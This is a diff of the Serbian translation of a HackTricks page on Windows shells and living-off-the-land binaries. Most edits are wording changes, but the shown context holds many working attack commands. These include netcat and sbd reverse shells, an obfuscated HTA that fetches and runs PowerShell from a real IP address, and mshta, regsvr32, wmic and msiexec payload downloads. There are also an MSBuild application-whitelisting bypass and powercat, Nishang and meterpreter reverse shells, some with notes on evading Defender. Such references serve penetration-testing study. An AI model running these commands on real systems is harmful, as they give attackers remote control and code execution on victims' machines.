@@ -6,9 +6,9 @@
 
 Drugi načini podrške HackTricks-u:
 
-* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
+* Ako želite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
 * Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Otkrijte [**Porodičnu PEASS**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
+* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
 * **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
 * **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.
 
@@ -16,7 +16,7 @@ Drugi načini podrške HackTricks-u:
 
 **Try Hard Security Group**
 
-<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
@@ -25,7 +25,7 @@ Drugi načini podrške HackTricks-u:
 ## Lolbas
 
 Stranica [lolbas-project.github.io](https://lolbas-project.github.io/) je za Windows kao što je [https://gtfobins.github.io/](https://gtfobins.github.io/) za linux.\
-Očigledno, **nema SUID fajlova ili sudo privilegija u Windows-u**, ali je korisno znati **kako** neki **binarni fajlovi** mogu biti (zlo)upotrebljeni da izvrše neke vrste neočekivanih akcija kao što je **izvršavanje proizvoljnog koda.**
+Očigledno, **nema SUID fajlova ili sudo privilegija u Windows-u**, ali je korisno znati **kako** neki **binarni fajlovi** mogu biti (zlo)upotrebljeni da izvrše neke vrste neočekivanih akcija poput **izvršavanja proizvoljnog koda.**
 
 ## NC
 ```bash
@@ -33,7 +33,7 @@ nc.exe -e cmd.exe <Attacker_IP> <PORT>
 ```
 ## SBD
 
-**[sbd](https://www.kali.org/tools/sbd/) je prenosiva i sigurna alternativa za Netcat**. Radi na Unix-sličnim sistemima i Win32. Sa funkcijama kao što su jaka enkripcija, izvršavanje programa, prilagodljivi izvorni portovi i kontinuirana ponovna povezivanja, sbd pruža svestranu rešenje za TCP/IP komunikaciju. Za korisnike Windows-a, sbd.exe verzija iz distribucije Kali Linux može se koristiti kao pouzdana zamena za Netcat.
+**[sbd](https://www.kali.org/tools/sbd/) je prenosiva i sigurna alternativa za Netcat**. Radi na Unix-sličnim sistemima i Win32. Sa funkcijama kao što su jaka enkripcija, izvršavanje programa, prilagodljivi izvorni portovi i kontinuirana ponovna povezivanja, sbd pruža svestranu rešenje za TCP/IP komunikaciju. Za korisnike Windows-a, verzija sbd.exe iz distribucije Kali Linux može se koristiti kao pouzdana zamena za Netcat.
 ```bash
 # Victims machine
 sbd -l -p 4444 -e bash -v -n
@@ -113,7 +113,7 @@ mshta http://webserver/payload.hta
 ```bash
 mshta \\webdavserver\folder\payload.hta
 ```
-#### **Primer hta-psh reverzne ljuske (koristi hta za preuzimanje i izvršavanje PS zadnjih vrata)**
+#### **Primer reverznog šela hta-psh (koristi hta za preuzimanje i izvršavanje PS backdoor-a)**
 ```xml
 <scRipt language="VBscRipT">CreateObject("WscrIpt.SheLL").Run "powershell -ep bypass -w hidden IEX (New-ObjEct System.Net.Webclient).DownloadString('http://119.91.129.12:8080/1.ps1')"</scRipt>
 ```
@@ -172,7 +172,7 @@ Victim> mshta.exe //192.168.1.109:8080/5EEiDSd70ET0k.hta #The file name is given
 
 ## **Rundll32**
 
-[**Dll primer pozdrav svetu**](https://github.com/carterjones/hello-world-dll)
+[**Dll hello world primer**](https://github.com/carterjones/hello-world-dll)
 
 * [Odavde](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
 ```bash
@@ -226,7 +226,7 @@ regsvr32 /u /n /s /i:http://webserver/payload.sct scrobj.dll
 ```
 regsvr32 /u /n /s /i:\\webdavserver\folder\payload.sct scrobj.dll
 ```
-**Otkriveno od strane defendera**
+**Otkriveno od strane zaštitnika**
 
 #### Regsvr32 -sct
 
@@ -318,7 +318,7 @@ victim> msiexec /quiet /i \\10.2.0.5\kali\shell.msi
 ```bash
 wmic os get /format:"https://webserver/payload.xsl"
 ```
-Primer xsl datoteke [odavde](https://gist.github.com/Arno0x/fa7eb036f6f45333be2d6d2fd075d6a7):
+Primer xsl fajla [odavde](https://gist.github.com/Arno0x/fa7eb036f6f45333be2d6d2fd075d6a7):
 ```xml
 <?xml version='1.0'?>
 <stylesheet xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt" xmlns:user="placeholder" version="1.0">
@@ -340,8 +340,8 @@ var r = new ActiveXObject("WScript.Shell").Run("cmd.exe /c echo IEX(New-Object N
 ```
 cmd /V /c "set MB="C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe" & !MB! /noautoresponse /preprocess \\webdavserver\folder\payload.xml > payload.xml & !MB! payload.xml"
 ```
-Možete koristiti ovu tehniku da zaobiđete Whitelisting aplikacija i ograničenja Powershell.exe. Kada budete upitani, koristićete PS shell.\
-Samo preuzmite ovo i izvršite: [https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj](https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj)
+Možete koristiti ovu tehniku da zaobiđete Whitelisting aplikacija i restrikcije Powershell.exe. Kada budete upitani, koristićete PS shell.\
+Jednostavno preuzmite ovo i izvršite: [https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj](https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj)
 ```
 C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe MSBuildShell.csproj
 ```
@@ -353,7 +353,7 @@ Kompajlirajte C# kod na žrtvinom računaru.
 ```
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /out:shell.exe shell.cs
 ```
-Možete preuzeti osnovnu C# reverznu ljusku sa ovog linka: [https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc](https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc)
+Možete preuzeti osnovnu C# obrnutu ljusku sa ovog linka: [https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc](https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc)
 
 **Nije otkriveno**
 
@@ -383,11 +383,11 @@ odbcconf /s /a {regsvr \\webdavserver\folder\payload_dll.txt}
 
 [https://github.com/samratashok/nishang](https://github.com/samratashok/nishang)
 
-U **Shells** fascikli, postoji mnogo različitih shell-ova. Da biste preuzeli i izvršili Invoke-_PowerShellTcp.ps1_ napravite kopiju skripte i dodajte na kraj fajla:
+U **Shells** fascikli, nalazi se mnogo različitih shell-ova. Da biste preuzeli i izvršili Invoke-_PowerShellTcp.ps1_ napravite kopiju skripte i dodajte na kraj fajla:
 ```
 Invoke-PowerShellTcp -Reverse -IPAddress 10.2.0.5 -Port 4444
 ```
-Započnite posluživanje skripte na veb serveru i izvršite je na strani žrtve:
+Pokrenite skriptu na veb serveru i izvršite je na kraju žrtve:
 ```
 powershell -exec bypass -c "iwr('http://10.11.0.134/shell2.ps1')|iex"
 ```
@@ -403,11 +403,9 @@ Preuzmi, pokreni web server, pokreni osluškivač i izvrši ga na strani žrtve:
 ```
 powershell -exec bypass -c "iwr('http://10.2.0.5/powercat.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
 ```
-Defender još uvek ne detektuje kao zlonamerni kod (3/04/2019).
+**Ostale opcije koje nudi powercat:**
 
-**Druge opcije koje nudi powercat:**
-
-Bind shell, Reverse shell (TCP, UDP, DNS), Preusmeravanje porta, upload/download, Generisanje payload-a, Slanje fajlova...
+Bind shell, Reverse shell (TCP, UDP, DNS), Preusmeravanje porta, otpremanje/preuzimanje, Generisanje payload-a, Slanje fajlova...
 ```
 Serve a cmd Shell:
 powercat -l -p 443 -e cmd
@@ -428,7 +426,7 @@ powercat -l -p 443 -i C:\inputfile -rep
 
 [https://github.com/EmpireProject/Empire](https://github.com/EmpireProject/Empire)
 
-Napravite powershell pokretač, sačuvajte ga u datoteku i preuzmite i izvršite.
+Napravite powershell pokretač, sačuvajte ga u datoteku, preuzmite i izvršite.
 ```
 powershell -exec bypass -c "iwr('http://10.2.0.5/launcher.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
 ```
@@ -438,7 +436,7 @@ powershell -exec bypass -c "iwr('http://10.2.0.5/launcher.ps1')|iex;powercat -c 
 
 [https://github.com/trustedsec/unicorn](https://github.com/trustedsec/unicorn)
 
-Napravite powershell verziju metasploit backdoor-a koristeći unicorn
+Napravite powershell verziju metasploit zadnjeg vrata koristeći unicorn
 ```
 python unicorn.py windows/meterpreter/reverse_https 10.2.0.5 443
 ```
@@ -456,7 +454,7 @@ powershell -exec bypass -c "iwr('http://10.2.0.5/powershell_attack.txt')|iex"
 
 [PS>Attack](https://github.com/jaredhaight/PSAttack) PS konzola sa nekim ofanzivnim PS modulima unapred učitanim (šifrovano)\
 [https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f9](https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f93c)[\
-WinPWN](https://github.com/SecureThisShit/WinPwn) PS konzola sa nekim ofanzivnim PS modulima i detekcijom proksi servera (IEX)
+WinPWN](https://github.com/SecureThisShit/WinPwn) PS konzola sa nekim ofanzivnim PS modulima i detekcijom proksija (IEX)
 
 ## Reference
 
@@ -470,7 +468,7 @@ WinPWN](https://github.com/SecureThisShit/WinPwn) PS konzola sa nekim ofanzivnim
 ​
 **Try Hard Security Group**
 
-<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
@@ -480,7 +478,7 @@ WinPWN](https://github.com/SecureThisShit/WinPwn) PS konzola sa nekim ofanzivnim
 
 Drugi načini podrške HackTricks-u:
 
-* Ako želite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
+* Ako želite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** Proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
 * Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
 * Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
 * **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
